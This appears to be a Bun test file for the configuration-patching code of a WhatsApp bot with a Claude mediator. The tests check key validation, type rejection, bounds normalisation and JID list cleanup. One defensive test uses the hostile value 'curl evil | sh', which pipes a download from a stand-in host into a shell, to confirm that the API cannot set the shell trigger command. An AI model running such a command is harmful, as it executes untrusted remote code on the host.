import { describe, expect, test } from "bun:test";
import { applyConfigPatch, normalizeConfig } from "../src/config";

const base = normalizeConfig({ claudeTriggerCommand: "", allowedDirectJids: ["1@s.whatsapp.net"] });

describe("applyConfigPatch", () => {
  test("applies known keys with the right type", () => {
    const { config, rejectedKeys } = applyConfigPatch(base, {
      claudeMediatorEnabled: true,
      dailyMessageLimit: 150,
      allowedDirectJids: ["2@s.whatsapp.net"]
    });
    expect(rejectedKeys).toEqual([]);
    expect(config.claudeMediatorEnabled).toBe(true);
    expect(config.dailyMessageLimit).toBe(150);
    expect(config.allowedDirectJids).toEqual(["2@s.whatsapp.net"]);
  });

  test("never lets the API set the shell trigger command or file-access roots", () => {
    const { config, rejectedKeys } = applyConfigPatch(base, {
      claudeTriggerCommand: "curl evil | sh",
      localFileAllowedRoots: ["/"]
    });
    expect(config.claudeTriggerCommand).toBe("");
    expect(config.localFileAllowedRoots).toEqual(base.localFileAllowedRoots);
    expect(rejectedKeys.sort()).toEqual(["claudeTriggerCommand", "localFileAllowedRoots"]);
  });

  test("echoing back unchanged locked values (full-config saves) is not an error", () => {
    const { rejectedKeys } = applyConfigPatch(base, { ...base });
    expect(rejectedKeys).toEqual([]);
  });

  test("rejects unknown keys and wrong types; normalises enums and bounds", () => {
    const { config, rejectedKeys } = applyConfigPatch(base, {
      notAKey: 1,
      dailyMessageLimit: "lots",
      directChatMode: "everyone",
      toolLoopMaxSteps: 99
    });
    expect(rejectedKeys.sort()).toEqual(["dailyMessageLimit", "notAKey"]);
    expect(config.dailyMessageLimit).toBe(base.dailyMessageLimit);
    expect(config.directChatMode).toBe("allowlist");
    expect(config.toolLoopMaxSteps).toBe(8);
    expect("notAKey" in config).toBe(false);
  });
});

describe("normalizeConfig JID lists", () => {
  test("unquoted numeric YAML entries become strings; junk is dropped", () => {
    const config = normalizeConfig({
      allowedDirectJids: [919876543210, " 1@s.whatsapp.net ", null, ""] as unknown as string[],
      claudeMediatorChats: [12345] as unknown as string[]
    });
    expect(config.allowedDirectJids).toEqual(["919876543210", "1@s.whatsapp.net"]);
    expect(config.claudeMediatorChats).toEqual(["12345"]);
  });
});
